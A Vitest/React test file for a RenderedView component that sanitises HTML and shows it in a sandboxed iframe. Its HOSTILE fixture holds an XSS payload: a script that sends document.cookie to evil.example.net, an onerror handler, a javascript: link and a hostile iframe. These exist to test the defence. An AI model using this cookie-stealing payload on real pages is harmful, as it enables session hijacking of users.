import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, cleanup, act } from '@testing-library/react';
import { RenderedView } from './RenderedView';
import { FRAME_CSP, FRAME_HEAD, frameDocument, frameTextColour, frameThumbColour } from './frame';

const HOSTILE =
  '<p><b>Invoice #4471</b> is overdue. <a href="javascript:alert(1)">Pay now</a></p>' +
  '<script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
  '<img src="https://evil.example.net/pixel.gif" onerror="alert(2)">' +
  '<iframe src="https://evil.example.net/"></iframe><style>body{display:none}</style>';

const SANITISED =
  '<p><b>Invoice #4471</b> is overdue. <a>Pay now</a></p><span>[image removed]</span>';

const api = () => window.api as unknown as Record<string, ReturnType<typeof vi.fn>>;

beforeEach(() => {
  api().htmlSanitize.mockReset();
  api().htmlSanitize.mockResolvedValue({ html: SANITISED, removed: { script: 1, img: 1 } });
});

afterEach(cleanup);

describe('RenderedView', () => {
  it('sends the markup to the sanitiser and renders the result in a sandboxed frame', async () => {
    const onSanitized = vi.fn();
    render(<RenderedView html={HOSTILE} onSanitized={onSanitized} />);
    expect(screen.getByText('Sanitising…')).toBeInTheDocument();
    await act(async () => {});
    expect(api().htmlSanitize).toHaveBeenCalledWith(HOSTILE);
    const frame = screen.getByTestId('ql-frame') as HTMLIFrameElement;
    expect(frame.getAttribute('sandbox')).toBe('');
    expect(frame.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(frame.getAttribute('srcdoc')?.startsWith(FRAME_HEAD)).toBe(true);
    expect(frame.getAttribute('srcdoc')).toContain(`content="${FRAME_CSP}"`);
    expect(frame.getAttribute('srcdoc')).toContain(SANITISED);
    expect(onSanitized).toHaveBeenCalledWith({ script: 1, img: 1 });
  });

  it('never assigns the source or the sanitised string anywhere but srcdoc', async () => {
    const innerHtml = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML')!;
    const setter = vi.fn();
    Object.defineProperty(Element.prototype, 'innerHTML', { ...innerHtml, set: setter });
    try {
      render(<RenderedView html={HOSTILE} onSanitized={vi.fn()} />);
      await act(async () => {});
    } finally {
      Object.defineProperty(Element.prototype, 'innerHTML', innerHtml);
    }
    expect(setter).not.toHaveBeenCalled();
    const everything = [...document.body.querySelectorAll('*')];
    for (const element of everything) {
      for (const attr of element.getAttributeNames()) {
        const value = element.getAttribute(attr) ?? '';
        if (attr === 'srcdoc') {
          expect(value).not.toContain('<script');
          expect(value).not.toContain('evil.example.net');
        } else {
          expect(value).not.toContain(SANITISED);
          expect(value).not.toContain('Invoice');
        }
      }
    }
    expect(document.body.textContent).not.toContain('Invoice');
    expect(document.querySelector('script')).toBeNull();
    expect(document.querySelectorAll('iframe')).toHaveLength(1);
  });

  it('shows a plain message when the sanitiser fails', async () => {
    const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    api().htmlSanitize.mockRejectedValue(new Error('ipc down'));
    render(<RenderedView html="<p>x</p>" onSanitized={vi.fn()} />);
    await act(async () => {});
    expect((screen.getByTestId('ql-frame') as HTMLIFrameElement).getAttribute('srcdoc')).toContain(
      'Could not render this clip.'
    );
    errSpy.mockRestore();
  });

  it('ignores a failure that lands after the markup changed', async () => {
    const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    let rejectFirst: (e: Error) => void = () => {};
    api().htmlSanitize.mockReturnValueOnce(new Promise((_, r) => (rejectFirst = r)));
    const { rerender } = render(<RenderedView html="<p>one</p>" onSanitized={vi.fn()} />);
    rerender(<RenderedView html="<p>two</p>" onSanitized={vi.fn()} />);
    await act(async () => {
      rejectFirst(new Error('late'));
    });
    expect(
      (screen.getByTestId('ql-frame') as HTMLIFrameElement).getAttribute('srcdoc')
    ).not.toContain('Could not render');
    errSpy.mockRestore();
  });

  it('ignores a result that lands after the markup changed', async () => {
    let resolveFirst: (r: { html: string; removed: Record<string, number> }) => void = () => {};
    api().htmlSanitize.mockReturnValueOnce(new Promise((r) => (resolveFirst = r)));
    const onSanitized = vi.fn();
    const { rerender } = render(<RenderedView html="<p>one</p>" onSanitized={onSanitized} />);
    rerender(<RenderedView html="<p>two</p>" onSanitized={onSanitized} />);
    await act(async () => {
      resolveFirst({ html: '<p>stale</p>', removed: {} });
    });
    expect(onSanitized).toHaveBeenCalledTimes(1);
    expect(onSanitized).toHaveBeenCalledWith({ script: 1, img: 1 });
    expect(
      (screen.getByTestId('ql-frame') as HTMLIFrameElement).getAttribute('srcdoc')
    ).not.toContain('stale');
  });

  it('builds the frame document with the CSP first and the theme text colour', () => {
    const doc = frameDocument('<p>hi</p>', '#123456');
    expect(doc.startsWith(FRAME_HEAD)).toBe(true);
    expect(doc).toContain('color:#123456');
    expect(doc.endsWith('<p>hi</p></body></html>')).toBe(true);
    expect(frameTextColour()).toBe('#eeeeee');
    document.body.style.setProperty('--text', '#abcdef');
    expect(frameTextColour()).toBe('#abcdef');
    document.body.style.removeProperty('--text');
  });

  it('gives the frame a scrollbar in the theme colour', () => {
    const doc = frameDocument('<p>hi</p>', '#123456', '#654321');
    expect(doc).toContain('::-webkit-scrollbar-thumb{background:#654321');
    expect(doc).toContain('::-webkit-scrollbar-button{display:none}');
    expect(frameThumbColour()).toBe('#4d4d4d');
    document.body.style.setProperty('--sb-thumb', '#101010');
    expect(frameThumbColour()).toBe('#101010');
    document.body.style.removeProperty('--sb-thumb');
  });
});
